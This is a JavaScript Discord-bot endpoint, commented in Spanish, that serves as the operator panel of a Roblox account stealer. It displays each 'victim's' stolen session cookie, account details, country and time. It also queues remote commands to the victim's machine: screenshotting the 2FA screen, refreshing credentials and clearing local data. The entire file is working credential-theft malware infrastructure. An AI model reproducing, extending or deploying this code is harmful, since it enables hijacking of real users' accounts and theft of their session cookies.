// api/interaction.js - VERSIÓN 100% SILENCIOSA
import { verifyKey } from 'discord-interactions';

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const signature = req.headers['x-signature-ed25519'];
    const timestamp = req.headers['x-signature-timestamp'];
    const body = JSON.stringify(req.body);

    if (process.env.DISCORD_PUBLIC_KEY) {
        const isValid = verifyKey(body, signature, timestamp, process.env.DISCORD_PUBLIC_KEY);
        if (!isValid) {
            return res.status(401).json({ error: 'Invalid signature' });
        }
    }

    const interaction = req.body;

    if (interaction.type === 1) {
        return res.status(200).json({ type: 1 });
    }

    if (interaction.type === 3) {
        const customId = interaction.data.custom_id;
        const [action, userId] = customId.split('_');
        
        const victimData = global.victims?.get(userId) || {};
        const r = victimData.roblox || {};

        if (action === 'roblox') {
            return res.status(200).json({
                type: 4,
                data: {
                    content: `||@here||
🔔 ¡Informacion seleccionada: **ROBLOX**!

**📌 PRINCIPAL **

👤 Usuario Roblox: ${r.username || 'No disponible'}
🆔 ID: ${r.userId || 'No disponible'}
💰 Robux: ${r.robux || 0}
⭐ Seguidores: ${r.seguidores || 0}
👥 Amigos: ${r.amigos || 0}
💱 Premium: ${r.premium || 'No'}
🔰 Verificado: ${r.verified || 'No'}

💼 **Inventario:**
Headless: \`${r.headless || 'No'}\`
Korblox: \`${r.korblox || 'No'}\`

**Informacion Horaria:**
🌍 País: \`${victimData.pais || 'Desconocido'}\`
📅 Fecha: \`${victimData.fecha || ''}\`
⏰ Hora Exacta: \`${victimData.hora || ''}\`

🍪 Cookie:
\`\`\`${victimData.cookie || 'No disponible'}\`\`\``,
                    flags: 64
                }
            });
        }

        if (action === 'discord') {
            return res.status(200).json({
                type: 4,
                data: {
                    content: `||@here||
🔔 ¡Informacion seleccionada: **DISCORD**!

**📌 PRINCIPAL **

👤 Usuario Discord: (No disponible - extensión no soporta Discord)
🆔 ID de Discord: (No disponible)
👥 Amigos: (No disponible)
💱 Discord nitro: (No disponible)

**Informacion Horaria:**
🌍 País: \`${victimData.pais || 'Desconocido'}\`
📅 Fecha: \`${victimData.fecha || ''}\`
⏰ Hora Exacta: \`${victimData.hora || ''}\`

✨ Token de sesión:
\`\`\`No disponible - Discord no usa cookies como Roblox\`\`\``,
                    flags: 64
                }
            });
        }

        if (action === 'comandos') {
            return res.status(200).json({
                type: 4,
                data: {
                    content: `||@here||
✏️ **¡ Comandos seleccionados ! **
Elige Una Opcion:`,
                    flags: 64,
                    components: [
                        {
                            type: 1,
                            components: [
                                {
                                    type: 2,
                                    style: 4,
                                    label: '📸 Capturar pantalla del 2FA',
                                    custom_id: `capturar_pantalla_${userId}`
                                }
                            ]
                        },
                        {
                            type: 1,
                            components: [
                                {
                                    type: 2,
                                    style: 1,
                                    label: '🔄 Actualizar credenciales',
                                    custom_id: `actualizar_credenciales_${userId}`
                                }
                            ]
                        },
                        {
                            type: 1,
                            components: [
                                {
                                    type: 2,
                                    style: 4,
                                    label: '🗑️ Limpiar datos locales',
                                    custom_id: `limpiar_datos_${userId}`
                                }
                            ]
                        }
                    ]
                }
            });
        }

        if (!global.commands) global.commands = new Map();
        let queue = global.commands.get(userId) || [];
        queue.push({ action: action });
        global.commands.set(userId, queue);

        return res.status(200).json({
            type: 4,
            data: {
                content: `✅ Orden \`${action}\` enviada a la víctima.`,
                flags: 64
            }
        });
    }

    return res.status(400).json({ error: 'Unhandled interaction type' });
}